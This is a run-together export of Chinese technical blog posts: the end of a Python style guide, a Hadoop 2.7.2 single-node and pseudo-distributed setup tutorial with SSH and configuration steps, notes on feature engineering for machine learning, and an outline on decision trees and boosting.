并使得问题快速显现出来. 而且, 幻想当文件对象析构时, 文件和sockets会自动关闭, 试图将文件对象的生命周期和文件的状态绑定在一起的想法, 都是不现实的. 因为有如下原因:1、没有任何方法可以确保运行环境会真正的执行文件的析构. 不同的Python实现采用不同的内存管理技术, 比如延时垃圾处理机制. 延时垃圾处理机制可能会导致对象生命周期被任意无限制的延长.2、对于文件意外的引用,会导致对于文件的持有时间超出预期(比如对于异常的跟踪, 包含有全局变量等). 推荐使用 “with”语句 以管理文件:123with open(\"hello.txt\") as hello_file: for line in hello_file: print line对于不支持使用”with”语句的类似文件的对象,使用 contextlib.closing():12345import contextlibwith contextlib.closing(urllib.urlopen(\"http://www.python.org/\")) as front_page: for line in front_page: print lineLegacy AppEngine 中Python 2.5的代码如使用”with”语句, 需要添加1from __future__ import with_statement TODO注释为临时代码使用TODO注释, 它是一种短期解决方案. 不算完美, 但够好了. TODO注释应该在所有开头处包含”TODO”字符串, 紧跟着是用括号括起来的你的名字, email地址或其它标识符. 然后是一个可选的冒号. 接着必须有一行注释, 解释要做什么. 主要目的是为了有一个统一的TODO格式, 这样添加注释的人就可以搜索到(并可以按需提供更多细节). 写了TODO注释并不保证写的人会亲自解决问题. 当你写了一个TODO, 请注上你的名字.12# TODO(kl@gmail.com): Use a \"*\" here for string repetition.# TODO(Zeke) Change this to use relations. 如果你的TODO是”将来做某事”的形式, 那么请确保你包含了一个指定的日期(“2009年11月解决”)或者一个特定的事件(“等到所有的客户都可以处理XML请求就移除这些代码”). 导入格式每个导入应该独占一行12Yes: import os import sys1No: import os, sys 导入总应该放在文件顶部, 位于模块注释和文档字符串之后, 模块全局变量和常量之前. 导入应该按照从最通用到最不通用的顺序分组:1、标准库导入2、第三方库导入3、应用程序指定导入每种分组中, 应该根据每个模块的完整包路径按字典序排序, 忽略大小写. 12345import foofrom foo import barfrom foo.bar import bazfrom foo.bar import Quuxfrom Foob import ar 语句通常每个语句应该独占一行不过, 如果测试结果与测试语句在一行放得下, 你也可以将它们放在同一行. 如果是if语句, 只有在没有else时才能这样做. 特别地, 绝不要对 try/except 这样做, 因为try和except不能放在同一行.123Yes: if foo: bar(foo)1234567891011No: if foo: bar(foo) else: baz(foo) try: bar(foo) except ValueError: baz(foo) try: bar(foo) except ValueError: baz(foo) 访问控制在Python中, 对于琐碎又不太重要的访问函数, 你应该直接使用公有变量来取代它们, 这样可以避免额外的函数调用开销. 当添加更多功能时, 你可以用属性(property)来保持语法的一致性. (译者注: 重视封装的面向对象程序员看到这个可能会很反感, 因为他们一直被教育: 所有成员变量都必须是私有的! 其实, 那真的是有点麻烦啊. 试着去接受Pythonic哲学吧) 另一方面, 如果访问更复杂, 或者变量的访问开销很显著, 那么你应该使用像 get_foo() 和 set_foo() 这样的函数调用. 如果之前的代码行为允许通过属性(property)访问 , 那么就不要将新的访问函数与属性绑定. 这样, 任何试图通过老方法访问变量的代码就没法运行, 使用者也就会意识到复杂性发生了变化. 命名module_name, package_name, ClassName, method_name, ExceptionName, function_name, GLOBAL_VAR_NAME, instance_var_name, function_parameter_name, local_var_name. 1、应该避免的名称（1）单字符名称, 除了计数器和迭代器.（2）包/模块名中的连字符(-)（3）双下划线开头并结尾的名称, 例如1__init__ 2、命名约定所谓”内部(Internal)”表示仅模块内可用, 或者, 在类内是保护或私有的.用单下划线()开头表示模块变量或函数是protected的(使用import * from时不会包含).用双下划线(_)开头的实例变量或方法表示类内私有.将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块.对类名使用大写字母开头的单词(如CapWords, 即Pascal风格), 但是模块名应该用小写加下划线的方式(如lower_with_under.py). 尽管已经有很多现存的模块使用类似于CapWords.py这样的命名, 但现在已经不鼓励这样做, 因为如果模块名碰巧和类名一致, 这会让人困扰. 3、Python之父Guido推荐的规范 Main即使是一个打算被用作脚本的文件, 也应该是可导入的. 并且简单的导入不应该导致这个脚本的主功能(main functionality)被执行, 这是一种副作用. 主功能应该放在一个main()函数中. 在Python中, pydoc以及单元测试要求模块必须是可导入的. 你的代码应该在执行主程序前总是检查1if __name__ == '__main__'这样当模块被导入时主程序就不会被执行. 12345def main(): ...if __name__ == '__main__': main() 所有的顶级代码在模块导入时都会被执行. 要小心不要去调用函数, 创建对象, 或者执行那些不应该在使用pydoc时执行的操作.","link":"/2017/03/17/Python%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83/"},{"title":"hadoop2.7.2单机与伪分布式安装","text":"环境相关系统：CentOS 6.8 64位jdk：1.7.0_79hadoop：hadoop 2.7.2 安装java环境详见：linux中搭建java开发环境 创建hadoop用户123456789101112131415161718192021222324# 以root用户登录su root# 创建一个hadoop组下的hadoop用户，并使用 /bin/bash 作为shelluseradd -m hadoop -G hadoop -s /bin/bash# useradd 主要参数# －c：加上备注文字，备注文字保存在passwd的备注栏中。# －d：指定用户登入时的启始目录# －D：变更预设值# －e：指定账号的有效期限，缺省表示永久有效# －f：指定在密码过期后多少天即关闭该账号# －g：指定用户所属的起始群组# －G：指定用户所属的附加群组# －m：自动建立用户的登入目录# －M：不要自动建立用户的登入目录# －n：取消建立以用户名称为名的群组# －r：建立系统账号# －s：指定用户登入后所使用的shell# －u：指定用户ID号# 设置hadoop用户密码，按提示输入两次密码# 学习阶段可简单设为\"hadoop\"，若提示“无效的密码，过于简单”，则再次输入确认即可passwd hadoop 可为hadoop用户增加管理员权限，避免一些对新手来说比较棘手的权限问题。123456789visudo# 找到 root ALL=(ALL) ALL 这行# 大致在第98行，可先按一下键盘上的ESC键，然后输入 :98# 在这行下面增加一行内容 hadoop ALL=(ALL) ALL## Allow root to run any commands anywhereroot ALL=(ALL) ALLhadoop ALL=(ALL) ALL保存退出后以刚才创建的hadoop用户登录 配置SSH免密码登录集群、单节点模式都需要用到 SSH 登陆，一般情况下，CentOS 默认已安装了 SSH client、SSH server，打开终端执行如下命令进行检验，查看是否包含了SSH client跟SSH server12345[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ rpm -qa | grep sshlibssh2-1.4.2-2.el6_7.1.x86_64openssh-5.3p1-118.1.el6_8.x86_64openssh-clients-5.3p1-118.1.el6_8.x86_64openssh-server-5.3p1-118.1.el6_8.x86_64 如果不包含，可以通过yum进行安装12sudo yum install openssh-clientssudo yum install openssh-server 测试下ssh是否可用12# 按提示输入密码hadoop，就可以登陆到本机ssh localhost 但这样登陆是需要每次输入密码的，我们需要配置成SSH无密码登陆比较方便。首先输入 exit 退出刚才的 ssh，就回到了我们原先的终端窗口。然后利用 ssh-keygen 生成密钥，并将密钥加入到授权中。12345678910111213# 退出刚才的 ssh localhostexit# 若没有该目录，请先执行一次ssh localhostcd ~/.ssh/# pwd查看当前目录，应为\"/home/hadoop/\"# ~ 代表的是用户的主文件夹，即 “/home/用户名” 这个目录# 会有提示，都按回车就可以ssh-keygen -t rsa cat id_rsa.pub &gt;&gt; authorized_keyschmod 600 ./authorized_keys 此时再用 ssh localhost 命令, 无需输入密码就可以直接登陆了123456789[hadoop@iZwz9b62gfdv0s2e67yo8kZ .ssh]$ ssh localhostLast login: Wed Feb 20 22:29:22 2017 from 127.0.0.1Welcome to Alibaba Cloud Elastic Compute Service ![hadoop@iZwz9b62gfdv0s2e67yo8kZ ~]$ exitlogoutConnection to localhost closed.[hadoop@iZwz9b62gfdv0s2e67yo8kZ .ssh]$ 安装hadoop2下载地址：http://mirrors.hust.edu.cn/apache/hadoop/common/hadoop-2.7.2/ 。下载 hadoop-2.7.2.tar.gz 和 hadoop-2.7.2.tar.gz.mds 文件，保存在/data/install_package/hadoop。 其中hadoop-2.x.y.tar.gz.mds文件是用来检查hadoop-2.x.y.tar.gz 文件的完整性的。如果文件发生了损坏或下载不完整，Hadoop 将无法正常运行。相关命令如下：123cd /data/install_package/hadoophead -n 6 hadoop-2.7.2.tar.gz.mdsmd5sum hadoop-2.7.2.tar.gz | tr \"a-z\" \"A-Z\" 若hadoop-2.x.y.tar.gz不完整，则这两个值差别很大 我们选择将 Hadoop 安装至 /data/hadoop/ 中12345sudo tar -zxf /data/install_package/hadoop/hadoop-2.6.0.tar.gz -C /data/hadoopcd /data/hadoop/sudo mv ./hadoop-2.7.2/ ./hadoop# 赋予权限，hadoop组及hadoop用户前面已经配置sudo chown -R hadoop:hadoop ./hadoop Hadoop 解压后即可使用。输入hadoop version，成功会显示版本信息 hadoop单机配置(非分布式)Hadoop 默认为非分布式模式，非分布式即单 Java 进程。 Hadoop 默认附带了丰富的例子，包括 wordcount、terasort、join、grep 等。执行下面命令可以查看： 在此我们选择运行 grep 例子，将 input 文件夹中的所有文件作为输入，筛选当中符合正则表达式 dfs[a-z.]+ 的单词并统计出现的次数，最后输出结果到 output 文件夹中。1234567891011cd /data/hadoopmkdir ./input# 将配置文件作为输入文件cp ./etc/hadoop/*.xml ./input # 筛选符合规则的单词并统计其出现次数./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar grep ./input ./output 'dfs[a-z.]+'# 查看运行结果[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ cat ./output/* 1 dfsadmin 若运行出现 WARN 提示【WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform… using builtin-java classes where applicable】，可以忽略，不会影响 Hadoop 正常运行（可通过编译 Hadoop 源码解决，详见：http://www.cnblogs.com/wuren/p/3962511.html）。 注意，Hadoop 默认不会覆盖结果文件，因此再次运行上面实例会提示出错，需要先将 ./output 删除。 hadoop伪分布式配置Hadoop 可以在单节点上以伪分布式方式运行，配置伪分布式前，我们需设置HADOOP环境变量。123456789101112131415# 编辑profilevim /etc/profile# 文件末尾新增export HADOOP_HOME=/data/hadoopexport HADOOP_INSTALL=$HADOOP_HOMEexport HADOOP_MAPRED_HOME=$HADOOP_HOMEexport HADOOP_COMMON_HOME=$HADOOP_HOMEexport HADOOP_HDFS_HOME=$HADOOP_HOMEexport YARN_HOME=$HADOOP_HOMEexport HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/nativeexport PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin# 使配置生效source /etc/profile 然后修改HADOOP核心配置文件，文件位于 /data/hadoop/etc/hadoop/ 中。伪分布式需要修改2个配置文件 core-site.xml 和 hdfs-site.xml。 修改配置文件 core-site.xml：12345678910111213141516# 默认配置&lt;configuration&gt;&lt;/configuration&gt;# 修改为&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp&lt;/value&gt; &lt;description&gt;Abase for other temporary directories.&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 同样修改配置文件 hdfs-site.xml：12345678910111213141516171819# 默认配置&lt;configuration&gt;&lt;/configuration&gt;# 修改为&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp/dfs/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp/dfs/data&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; hadoop配置文件详解可查看官方文档，也可以移步：http://www.iyunv.com/thread-17698-1-1.html 配置完成后，格式化NameNode1./bin/hdfs namenode -format 成功的话，会看到 “successfully formatted” 和 “Exitting with status 0” 的提示，若为 “Exitting with status 1” 则是出错。 接着开启 NaneNode 和 DataNode 守护进程：1./sbin/start-dfs.sh 若出现如下 SSH 的提示 “Are you sure you want to continue connecting”，输入 yes 即可。启动时可能会有 WARN 提示 “WARN util.NativeCodeLoader…”，如前面提到的，这个提示不会影响正常使用。 启动完成后，可以通过命令 jps 来判断是否成功启动，若成功启动则会列出如下进程: “NameNode”、”DataNode”和SecondaryNameNode（如果 SecondaryNameNode 没有启动，请运行 sbin/stop-dfs.sh 关闭进程，然后再次尝试启动尝试）。如果没有 NameNode 或 DataNode ，那就是配置不成功，请仔细检查之前步骤，或通过查看启动日志排查原因。 12345[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ jps20339 SecondaryNameNode20166 DataNode20027 NameNode15375 Jps 通过查看启动日志分析启动失败原因有时 Hadoop 无法正确启动，如 NameNode 进程没有顺利启动，这时可以查看启动日志来排查原因，注意几点： 启动时会提示形如 “dblab: starting namenode, logging to /data/hadoop/logs/hadoop-hadoop-namenode-iZwz9b62gfdv0s2e67yo8kZ.out”，其中 iZwz9b62gfdv0s2e67yo8kZ 对应你的主机名，但启动的日志信息是记录在 /data/hadoop/logs/hadoop-hadoop-namenode-iZwz9b62gfdv0s2e67yo8kZ.log 中，所以应该查看这个后缀为 .log 的文件； 每一次的启动日志都是追加在日志文件之后，所以得拉到最后面看，看下记录的时间就知道了。 一般出错的提示在最后面，也就是写着 Fatal、Error 或者 Java Exception 的地方。 可以在网上搜索一下出错信息，看能否找到一些相关的解决方法。 成功启动后，可以访问 Web 界面 http://ip:50070 查看 NameNode 和 Datanode 信息，还可以在线查看 HDFS 中的文件。 运行hadoop伪分布式实例上面的单机模式，grep 例子读取的是本地数据，伪分布式读取的则是 HDFS 上的数据。要使用 HDFS，首先需要在 HDFS 中创建用户目录： 1./bin/hdfs dfs -mkdir -p /user/hadoop 接着将 ./etc/hadoop 中的 xml 文件作为输入文件复制到分布式文件系统中，即将 /data/hadoop/etc/hadoop 复制到分布式文件系统中的 /user/hadoop/input 中。我们使用的是 hadoop 用户，并且已创建相应的用户目录 /user/hadoop ，因此在命令中就可以使用相对路径如 input，其对应的绝对路径就是 /user/hadoop/input: 12./bin/hdfs dfs -mkdir input./bin/hdfs dfs -put ./etc/hadoop/*.xml input 复制完成后，可以通过如下命令查看 HDFS 中的文件列表：1./bin/hdfs dfs -ls input 伪分布式运行 MapReduce 作业的方式跟单机模式相同，区别在于伪分布式读取的是HDFS中的文件（可以将单机步骤中创建的本地 input 文件夹，输出结果 output 文件夹都删掉来验证这一点）。 12345678910./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar grep input output 'dfs[a-z.]+'# 查看运行结果的命令（查看的是位于HDFS中的输出结果）./bin/hdfs dfs -cat output/*# 结果如下1 dfsadmin1 dfs.replication1 dfs.namenode.name.dir1 dfs.datanode.data.dir 我们也可以将运行结果取回到本地：123rm -r ./output # 先删除本地的 output 文件夹（如果存在）./bin/hdfs dfs -get output ./outputcat ./output/* 运行程序时，输出目录不能存在。在实际开发应用程序时，可考虑在程序中加上如下代码，能在每次运行时自动删除输出目录，避免繁琐的命令行操作.123456Configuration conf = new Configuration();Job job = new Job(conf); /* 删除输出目录 */Path outputPath = new Path(args[1]);outputPath.getFileSystem(conf).delete(outputPath, true); 若要关闭 Hadoop，则运行1./sbin/stop-dfs.sh下次启动 hadoop 时，无需进行 NameNode 的初始化，只需要运行 ./sbin/start-dfs.sh 即可 启动YARN伪分布式不启动 YARN 也可以，一般不会影响程序执行。 有的人可能会疑惑，怎么启动 Hadoop 后，见不到书上所说的 JobTracker 和 TaskTracker，这是因为Hadoop2使用了新的 MapReduce 框架（MapReduce V2，也称为 YARN，Yet Another Resource Negotiator）。 YARN 是从 MapReduce 中分离出来的，负责资源管理与任务调度。YARN 运行于 MapReduce 之上，提供了高可用性、高扩展性，YARN 的更多介绍在此不展开，有兴趣的可移步：http://blog.chinaunix.net/uid-28311809-id-4383551.html 上述通过 ./sbin/start-dfs.sh 启动 Hadoop，仅仅是启动了 MapReduce 环境，我们可以启动 YARN ，让 YARN 来负责资源管理与任务调度。 首先修改配置文件 mapred-site.xml：123456789mv ./etc/hadoop/mapred-site.xml.template ./etc/hadoop/mapred-site.xmlvim ./etc/hadoop/mapred-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 然后就可以启动YARN了，当然，首先需要先执行过 ./sbin/start-dfs.sh123./sbin/start-yarn.sh $ 启动YARN# 开启历史服务器，才能在Web中查看任务运行情况./sbin/mr-jobhistory-daemon.sh start historyserver 然后通过jps查看，可以看到多了 NodeManager 和 ResourceManager 两个后台进程。 启动 YARN 之后，运行实例的方法还是一样的，仅仅是资源管理方式、任务调度不同。观察日志信息可以发现，不启用 YARN 时，是 “mapred.LocalJobRunner” 在跑任务，启用 YARN 之后，是 “mapred.YARNRunner” 在跑任务。启动 YARN 有个好处是可以通过 Web 界面查看任务的运行情况：http://ip:8088/cluster 但 YARN 主要是为集群提供更好的资源管理与任务调度，然而这在单机上体现不出价值，反而会使程序跑得稍慢些。因此在单机上是否开启 YARN 就看实际情况了。 不启动 YARN 需重命名 mapred-site.xml。如果不想启动 YARN，务必把配置文件 mapred-site.xml 重命名，改成 mapred-site.xml.template，需要用时改回来就行。否则在该配置文件存在，而未开启 YARN 的情况下，运行程序会提示 “Retrying connect to server: 0.0.0.0/0.0.0.0:8032” 的错误，这也是为何该配置文件初始文件名为 mapred-site.xml.template。 链接相关大数据进阶计划http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ hadoop2下载地址http://mirrors.hust.edu.cn/apache/hadoop/common/hadoop-2.7.2/ Yarn简单介绍及内存配置http://blog.chinaunix.net/uid-28311809-id-4383551.html hadoop配置文件详解http://www.iyunv.com/thread-17698-1-1.html","link":"/2017/02/21/hadoop2.7.2%E5%8D%95%E6%9C%BA%E4%B8%8E%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E5%AE%89%E8%A3%85/"},{"title":"机器学习（九）：特征工程","text":"特征工程是什么数据和特征决定机器学习上限，而模型和算法只是逼近这个上限。特征工程目的：最大限度地从原始数据中提取特征以供算法和模型使用。 数据清洗数据清洗的结果直接关系到模型效果以及最终的结论。在实际的工作中，数据清洗通常占开发过程的 50%-80% 的时间。 在数据预处理过程主要考虑两个方面，如下： 选择数据处理工具：关系型数据库戒者Python 查看数据的元数据以及数据特征：一是查看元数据，包括字段解释、数据来源等一切可以描述数据的信息；另外是抽取一部分数据，通过人工查看的方式，对数据本身做一个比较直观的了解，并且初步发现一些问题，为之后的数据处理做准备。 缺省值清洗缺省值是数据中最常见的一个问题，处理缺省值有很多方式，主要包括以下四个步骤进行缺省值处理： 确定缺省值范围 去除不需要的字段 填充缺省值内容 重新获取数据 注意：最重要的是 缺省值内容填充。 在进行确定缺省值范围的时候，对每个字段都计算其缺失比例，然后按照缺失比例和字段重要性分别指定不同的策略。 在进行去除不需要的字段的时候，需要注意的是：删除操作最好不要直接操作不原始数据上，最好的是抽取部分数据进行删除字段后的模型构建，查看模型效果，如果效果不错，那么再到全量数据上进行删除字段操作。总而言之：该过程简单但是必须慎用，不过一般效果不错，删除一些丢失率高以及重要性低的数据可以降低模型的训练复杂度，同时又不会降低模型的效果。 填充缺省值很重要，常用方法如下： 以业务知识经验推测填充缺省值 以同一字段指标的计算结果(均值、中位数、众数等)填充缺省值 以不同字段指标的计算结果来推测性的填充缺省值，比如通过身仹证号码计算年龄、通过收货地址来推测家庭住址、通过访问的IP地址来推测家庭/公司/学校的家庭住址等等 如果某些指标非常重要，但是缺失率有比较高，而且通过其它字段没法比较精准的计算出指标值的情况下，那么就需要和数据产生方(业务人员、数据收集人员等)沟通协商，是否可以通过其它的渠道获取相关的数据，也就是进行重新获取数据的操作。 格式内容清洗一般情况下，数据是由用户/访客产生的，也就有很大的可能性存在格式和内容上不一致的情况，所以在进行模型构建之前需要先进行数据的格式内容清洗操作。格式内容问题主要有以下几类： 时间、日期、数值、半全角等显示格式不一致：直接将数据转换为一类格式即可，该问题一般出现在多个数据源整合的情况下。 内容中有不该存在的字符：最典型的就是在头部、中间、尾部的空格等问题，这种 情况下，需要以半自劢校验加半人工方式来找出问题，并去除不需要的字符。内容不该字段应有的内容不符：比如姓名写成了性别、身仹证号写成手机号等问题。 逻辑错误清洗主要是通过简单的逻辑推理发现数据中的问题数据，防止分析结果走偏，主要包含以下几个步骤： 数据去重 去除/替换不合理的值 去除/重构不可靠的字段值(修改矛盾的内容) 去除不需要的数据一般情况下，我们会尽可能多的收集数据，但是不是所有的字段数据都是可以应用到模型构建过程的，也不是说将所有的字段属性都放到构建模型中，最终模型的效果就一定会好，实际上来讲，字段属性越多，模型的构建就会越慢，所以有时候可以考虑将不要的字段进行删除操作。在进行该过程的时候，要注意备仹原始数据。 关联性验证如果数据有多个来源，那么有必要进行关联性验证，该过程常应用到多数据源合并的过程中，通过验证数据之间的关联性来选择比较正确的特征属性，比如：汽车的线下贩买信息和电话客服问卷信息，两者之间可以通过姓名和手机号进行关联操作，匹配两者之间的车辆信息是否是同一辆，如果不是，那么就需要进行数据调整。 特征转换特征转换主要指将原始数据中的字段数据进行转换操作，从而得到适合进行算法模型构建的输入数据(数值型数据)，在这个过程中主要包括但不限于以下几种数据的处理： 文本数据转换为数值型数据 缺省值填充 定性特征属性哑编码 定量特征属性二值化 特征标准化不归一化 文本特征属性转换机器学习的模型算法均要求输入的数据必须是数值型的，所以对于文本类型的特征属性，需要进行文本数据转换，也就是需要将文本数据转换为数值型数据。常用方式如下： 词袋法(BOW/TF) TF-IDF(Term frequency-inverse document frequency) HashTF Word2Vec 词袋法词袋法(Bag of words, BOW)是最早应用于NLP和IR领域的一种文本处理模型，该模型忽略文本的语法和语序，用一组无序的单词(words)来表达一段文字戒者一个文档，词袋法中使用单词在文档中出现的次数(频数)来表示文档。 词集法(Set of words, SOW)是词袋法的一种变种，应用的比较多，和词袋法的原理一样，是以文档中的单词来表示文档的一种的模型，区别在于：词袋法使用的是单词的频数，而在词集法中使用的是单词是否出现，如果出现赋值为1，否则为0。 TF-IDF词条的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降；也就是说词条在文本中出现的次数越多，表示该词条对该文本的重要性越高，词条在所有文本中出现的次数越少，说明这个词条对文本的重要性越高。TF(词频)指某个词条在文本中出现的次数，一般会将其进行归一化处理(该词条数量/该文档中所有词条数量)；IDF(逆向文件频率)指一个词条重要性的度量，一般计算方式为总文件数目除以包含该词语之文件的数目，再将得到的商取对数得到。TF-IDF实际上是：TF * IDF 假设单词用t表示，文档用d表示，语料库用D表示，那么N(t,D)表示包含单词t的文档数量，|D|表示文档数量，|d|表示文档d中的所有单词数量。N(t,d)表示在文档d中单词t出现的次数。 TF-IDF除了使用默认的tf和idf公式外，tf和idf公式还可以使用一些扩展之后公式来进行指标的计算，常用的公式有： 有两个文档，单词统计如下，请分别计算各个单词在文档中的TF-IDF值以及这些文档使用单词表示的特征向量。 HashTF-IDF不管是前面的词袋法还是TF-IDF，都避免不了计算文档中单词的词频，当文档数量比较少、单词数量比较少的时候，我们的计算量不会太大，但是当这个数量上升到一定程度的时候，程序的计算效率就会降低下去，这个时候可以通过HashTF的形式来解决该问题。 HashTF的计算规则是：在计算过程中，不计算词频，而是计算单词进行hash后的hash值的数量(有的模型中可能存在正则化操作)； HashTF的特点：运行速度快，但是无法获取高频词，有可能存在单词碰撞问题(hash值一样) 在scikit中，对于文本数据主要提供了三种方式将文本数据转换为数值型的特征向量，同时提供了一种对TF-IDF公式改版的公式。所有的转换方式均位于模块：sklearn.feature_extraction.text Word2VecWord2Vec是Google于2013年开源推出的一个用户获取wordvector的工具包，具有简单、高效的特性；Word2Vec通过对文档中所有单词进行分析，获得单词之间的关联程度，从而获取词向量，最终形成一个词向量矩阵。对词向量矩阵的分析：分类、聚类、相似性计算等等；是一种在NLP和大数据机器学习中应用比较多的一种文本转换数值型向量的方式。 吴恩达word2vec视频讲解吴恩达word2vec总结 无量纲化无量纲化使不同规格的数据转换到同一规格。常见的无量纲化方法有标准化和区间缩放法。标准化的前提是特征值服从正态分布，标准化后，其转换成标准正态分布。区间缩放法利用了边界值信息，将特征的取值区间缩放到某个特点的范围，例如[0, 1]等。 标准化标准化：基于特征属性的数据(也就是特征矩阵的列)，获取均值和方差，然后将特征值转换至服从标准正态分布。计算公式如下： 区间缩放法区间缩放法的思路有多种，常见的一种为利用两个最值进行缩放，公式表达为： 归一化简单来说，标准化是依照特征矩阵的列处理数据，其通过求z-score的方法，将样本的特征值转换到同一量纲下。归一化是依照特征矩阵的行处理数据，其目的在于样本向量在点乘运算或其他核函数计算相似性时，拥有统一的标准，也就是说都转化为“单位向量”。规则为l2的归一化公式如下： 对定性特征哑编码定性变量是反映”职业”、”教育程度”等现象属性特点的变量，只能反映现象的属性特点，而不能说明具体量的大小和差异。 哑编码(OneHotEncoder)：对于定性的数据(也就是分类的数据)，可以采用N位的状态寄存器来对N个状态进行编码，每个状态都有一个独立的寄存器位，并且在仸意状态下只有一位有效；是一种常用的将特征数字化的方式。比如有一个特征属性:[‘male’,’female’]，那么male使用向量[1,0]表示，female使用[0,1]表示。 对定量特征二值化定量变量是反映类似”天气温度”和”月收入”等属性的变量，可以用数值表示其观察结果，这些数值具有明确的数值含义，不仅能分类而且能测量出来具体大小和差异。这些变量就是定量变量也称数值变量，定量变量的观察结果成为定量数据。是说明事物数字特征的一个名称。 二值化(Binarizer)：对于定量的数据根据给定的阈值，将其进行转换，如果大于阈值，那么赋值为1；否则赋值为0 缺省值填充对于缺省的数据，在处理之前一定需要进行预处理操作，一般采用中位数、均值戒者众数来进行填充，在scikit中主要通过Imputer类来实现对缺省值的填充 数据多项式扩充变换多项式数据变换主要是指基于输入的特征数据按照既定的多项式规则构建更多的输出特征属性，比如输入特征属性为[a,b]，当设置degree为2的时候，那么输出的多项式特征为[1, a, b, a^2, ab, b^2] 特征选择当做完特征转换后，实际上可能会存在很多的特征属性，比如：多项式扩展转换、文本数据转换等等，但是太多的特征属性的存在可能会导致模型构建效率降低，同时模型的效果有可能会变的不好，那么这个时候就需要从这些特征属性中选择出影响最大的特征属性作为最后构建模型的特征属性列表。 在选择模型的过程中，通常从两方面来选择特征： 特征是否发散：如果一个特征不发散，比如方差解决于0，也就是说这样的特征对于样本的区分没有什么作用。 特征不目标的相关性：如果不目标相关性比较高，应当优先选择。 根据特征选择的形式又可以将特征选择方法分为3种： Filter：过滤法，按照发散性戒者相关性对各个特征进行评分，设定阈值戒者待选择阈值的个数，从而选择特征；常用方法包括方差选择法、相关系数法、卡方检验、互信息法等。 Wrapper：包装法，根据目标函数（通常是预测效果评分），每次选择若干特征戒者排除若干特征；常用方法主要是递归特征消除法。 Embedded：嵌入法，先使用某些机器学习的算法和模型进行训练，得到各个特征的权重系数，根据系数从大到小选择特征；常用方法主要是基于惩罚项的特征选择法。 Filter方差选择法方差选择法：先计算各个特征属性的方差值，然后根据阈值，获取方差大于阈值的特征。 相关系数法相关系数法：先计算各个特征属性对于目标值的相关系数以及相关系数的P值，然后获取大于阈值的特征属性。 卡方检验经典的卡方检验是检验定性自变量对定性因变量的相关性。假设自变量有N种取值，因变量有M种取值，考虑自变量等于i且因变量等于j的样本频数的观察值与期望的差距，构建统计量： 不难发现，这个统计量的含义简而言之就是自变量对因变量的相关性。 互信息法经典的互信息也是评价定性自变量对定性因变量的相关性的，互信息计算公式如下： 为了处理定量数据，最大信息系数法被提出 Wrapper递归特征消除法递归特征消除法：使用一个基模型来进行多轮训练，每轮训练后，消除若干权值系数的特征，再基于新的特征集进行下一轮训练。 Embedded基于惩罚项的特征选择法在使用惩罚项的基模型，除了可以筛选出特征外，同时还可以进行降维操作。 基于树模型的特征选择法树模型中GBDT在构建的过程会对特征属性进行权重的给定，所以GBDT也可以应用在基模型中进行特征选择。 降维特征选择完成后，可以直接进行模型训练，但是可能由于特征矩阵过大，导致计算量大，为了节省训练时长，可以降低特征矩阵的维度。 常见的降维方法除了基于L1的惩罚模型外，还有主成分析法(PCA)和线性判别分析法(LDA)，这两种方法的本质都是将原始数据映射到维度更低的样本空间中；但是采用的方式不同，PCA是为了让映射后的样本具有更大的发散性，LDA是为了让映射后的样本有最好的分类性能 。 主成分分析法 PCA主成分析(PCA)：将高纬的特征向量合并成低纬的特征属性，是一种无监督的降维方法。吴恩达PCA算法讲解 线性判别分析法 LDA线性判断分析(LDA)：LDA是一种基于分类模型进行特征属性合并的操作，是一种有监督的降维方法。 异常检测吴恩达异常检测讲解","link":"/2017/11/02/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9A%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B/"},{"title":"机器学习（二）：决策树、随机森林和提升算法","text":"持续更新中。。。 决策树 示例代码 信息熵、联合熵、条件熵、相对熵、互信息的定义 什么是最大熵 什么是决策树 决策树构建过程 决策树的纯度 ID3、C4.5、CART介绍 剪枝 决策树优化策略 决策树总结 相关链接 集成方法 bootstrap, boosting, bagging 简介 提升算法 Adboost、GBDT、Xgboost 简介 GBDT简介 从回归树到GBDT GBDT与随机森林 GBDT与XGBOOST 怎么理解决策树、xgboost能处理缺失值？而有的模型(svm)对缺失值比较敏感 决策树如何处理不完整数据 怎么理解决策树、xgboost能处理缺失值而有的模型svm对缺失值比较敏感 随机森林如何处理缺失值 随机森林如何评估特征重要性 为什么xgboost要用泰勒展开，优势在哪里 xgboost如何寻找最优特征，是有放回还是无放回 信息熵、联合熵、条件熵、相对熵、互信息的定义下面的截图截自宗成庆的《统计自然语言处理 》： 